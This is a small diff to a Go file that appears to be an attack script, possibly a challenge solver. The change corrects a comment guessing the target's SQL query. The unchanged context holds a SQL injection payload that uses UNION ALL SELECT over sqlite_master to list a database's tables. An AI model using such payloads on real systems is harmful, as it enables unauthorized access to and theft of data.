@@ -42,7 +42,7 @@ func getToken(url string) (string, error) {
 }
 
 // I imagine the original query is something like:
-// SELECT url, name FROM trolls WHERE LIKE '%s'
+// SELECT url, name FROM trolls WHERE name LIKE '%s'
 const tablesQuery = `' OR 1=1 UNION ALL SELECT sql, name FROM sqlite_master WHERE type='table'--`
 
 func getTables(url, token string) ([]string, error) {
